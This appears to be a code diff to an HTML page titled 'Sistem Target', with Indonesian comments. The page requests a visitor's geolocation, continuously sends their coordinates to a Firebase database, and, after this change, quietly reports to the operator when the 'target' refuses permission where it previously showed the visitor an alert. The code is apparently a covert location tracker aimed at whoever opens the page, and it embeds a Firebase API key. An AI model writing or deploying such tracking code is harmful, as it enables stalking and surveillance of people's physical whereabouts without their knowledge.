@@ -4,9 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Target</title>
-    <script src="https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js"></script>
-    <script>
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
+        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+
         // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
@@ -19,15 +20,15 @@
         };
 
         // Inisialisasi Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
 
         // Fungsi untuk mendapatkan lokasi
         function getLocation() {
+            console.log("Meminta lokasi...");
             if (navigator.geolocation) {
                 navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0 // Jangan gunakan lokasi yang sudah lama
+                    enableHighAccuracy: true
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
@@ -39,31 +40,35 @@
             const lon = position.coords.longitude;
 
             // Mengirim data lokasi ke Firebase
-            const locationRef = database.ref('devices/device1');
-            locationRef.set({
+            const locationRef = ref(database, 'devices/device1'); // ID perangkat unik
+            set(locationRef, {
                 latitude: lat,
                 longitude: lon,
                 timestamp: Date.now()
-            }).then(() => {
-                console.log("Data lokasi berhasil dikirim ke Firebase");
-            }).catch((error) => {
-                console.error("Gagal mengirim data ke Firebase:", error);
             });
+
+            // Menghapus pesan penolakan izin (jika ada)
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            remove(notificationRef);
         }
 
         function showError(error) {
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    alert("Anda tidak mengizinkan lokasi.");
+                    set(notificationRef, {
+                        message: "Target tidak izinkan lokasi"
+                    });
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    alert("Informasi lokasi tidak tersedia.");
+                    alert("Location information is unavailable.");
                     break;
                 case error.TIMEOUT:
-                    alert("Waktu permintaan lokasi habis.");
+                    alert("The request to get user location timed out.");
                     break;
                 case error.UNKNOWN_ERROR:
-                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    alert("An unknown error occurred.");
                     break;
             }
         }
